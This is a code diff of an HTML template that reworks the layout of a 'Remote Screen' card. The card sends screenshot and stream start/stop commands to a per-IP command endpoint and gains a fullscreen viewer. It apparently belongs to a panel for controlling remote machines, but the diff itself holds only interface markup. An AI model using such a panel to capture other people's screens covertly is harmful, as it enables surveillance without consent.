@@ -1,10 +1,41 @@
-<div class="col-span-1 glass-effect rounded-xl p-6 shadow-lg">
-    <div class="flex items-center gap-3 mb-4">
-        <div
-            class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
+<div class="col-span-1 md:col-span-2 glass-effect rounded-xl p-6 shadow-lg">
+    <div class="flex items-center justify-between mb-4">
+        <div class="flex items-center gap-3">
+            <div
+                class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
+            >
+                <svg
+                    class="w-4 h-4 text-gray-300"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                >
+                    <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
+                    ></path>
+                </svg>
+            </div>
+            <h3 class="text-xl font-semibold text-white">Remote Screen (RS)</h3>
+        </div>
+    </div>
+
+    <div
+        class="bg-rgb(16,16,16) rounded-xl mb-4 p-2 flex justify-center items-center min-h-[360px] border border-gray-700/30 relative"
+    >
+        <canvas
+            id="screen-canvas-{{ ip }}"
+            class="max-w-full max-h-full rounded bg-gray-800/50"
+        ></canvas>
+        <button
+            onclick="openFullscreenScreen('{{ ip }}')"
+            class="absolute top-3 right-3 bg-black/50 hover:bg-black/70 text-white p-2 rounded-lg transition-all duration-200"
+            title="Open fullscreen"
         >
             <svg
-                class="w-4 h-4 text-gray-300"
+                class="w-4 h-4"
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -13,16 +44,17 @@
                     stroke-linecap="round"
                     stroke-linejoin="round"
                     stroke-width="2"
-                    d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
+                    d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"
                 ></path>
             </svg>
-        </div>
-        <h3 class="text-lg font-semibold text-white">Remote Screen (RS)</h3>
+        </button>
     </div>
+
     <div class="space-y-3">
         <form
             hx-post="/api/command/{{ ip }}"
             hx-target="#command-output-{{ ip }}"
+            class="w-full"
         >
             <input type="hidden" name="module" value="RS" />
             <input type="hidden" name="args.action" value="screenshot" />
@@ -52,20 +84,14 @@
                 Take Screenshot
             </button>
         </form>
-        <div class="grid grid-cols-2 gap-2">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
             <form
                 hx-post="/api/command/{{ ip }}"
                 hx-target="#command-output-{{ ip }}"
+                class="w-full"
             >
                 <input type="hidden" name="module" value="RS" />
                 <input type="hidden" name="args.action" value="stream_start" />
-                <input
-                    type="number"
-                    name="args.fps"
-                    value="15"
-                    class="w-full p-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white text-center mb-2"
-                    placeholder="FPS"
-                />
                 <button
                     type="submit"
                     class="w-full bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
@@ -73,28 +99,53 @@
                     Start Stream
                 </button>
             </form>
-            <div class="flex items-end">
-                <form
-                    hx-post="/api/command/{{ ip }}"
-                    hx-target="#command-output-{{ ip }}"
-                    class="w-full"
+            <form
+                hx-post="/api/command/{{ ip }}"
+                hx-target="#command-output-{{ ip }}"
+                class="w-full"
+            >
+                <input type="hidden" name="module" value="RS" />
+                <input type="hidden" name="args.action" value="stream_stop" />
+                <button
+                    type="submit"
+                    class="w-full bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                 >
-                    <input type="hidden" name="module" value="RS" />
-                    <input
-                        type="hidden"
-                        name="args.action"
-                        value="stream_stop"
-                    />
-                    <button
-                        type="submit"
-                        class="w-full bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
-                        style="height: 40px; margin-top: 36px"
-                    >
-                        Stop Stream
-                    </button>
-                </form>
-            </div>
+                    Stop Stream
+                </button>
+            </form>
         </div>
+    </div>
+</div>
+
+<!-- Fullscreen Screen Modal -->
+<div
+    id="fullscreen-screen-{{ ip }}"
+    class="fixed inset-0 bg-black z-50 hidden flex items-center justify-center"
+>
+    <div class="relative w-full h-full flex items-center justify-center">
+        <canvas
+            id="fullscreen-screen-canvas-{{ ip }}"
+            class="max-w-full max-h-full"
+        ></canvas>
+        <button
+            onclick="closeFullscreenScreen('{{ ip }}')"
+            class="absolute top-4 right-4 bg-black/50 hover:bg-black/70 text-white p-3 rounded-lg transition-all duration-200"
+            title="Exit fullscreen"
+        >
+            <svg
+                class="w-6 h-6"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+            >
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M6 18L18 6M6 6l12 12"
+                ></path>
+            </svg>
+        </button>
     </div>
 </div>
 
